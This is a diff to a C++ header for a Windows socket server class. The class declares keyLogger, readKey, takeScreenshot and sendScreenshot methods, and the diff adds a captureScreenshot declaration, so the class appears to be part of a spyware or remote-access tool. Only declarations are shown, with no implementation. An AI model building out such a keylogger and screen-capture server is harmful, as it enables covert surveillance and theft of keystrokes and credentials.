@@ -9,13 +9,15 @@
 #include <iostream>
 #include <gdiplus.h>
 #include <fstream>
+#include <vector>
+#include <cstdint>
 
 // Ensure NO_ERROR is defined
 #ifndef NO_ERROR
 #define NO_ERROR 0
 #endif
 
-#pragma comment (lib,"Gdiplus.lib")
+#pragma comment (lib,"gdiplus.lib")
 
 using namespace Gdiplus;
 
@@ -30,14 +32,17 @@ public:
     void readKey(int, SOCKET);
     void keyLogger(SOCKET);
 
-
 private:
     int port;
     SOCKET listenSocket;
     ULONG_PTR gdiplusToken; // Add this member
     void handleClient(SOCKET clientSocket);
     void takeScreenshot(const std::string& filename);
-    void sendScreenshot(SOCKET clientSocket, const std::string& filename);
+    // void sendScreenshot(SOCKET clientSocket, const std::string& filename);
+    void sendScreenshot(SOCKET clientSocket, const std::string &filePath);
+    std::vector<unsigned char> captureScreenshot();
 };
+
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
 
 #endif // SERVER_SOCKET_H
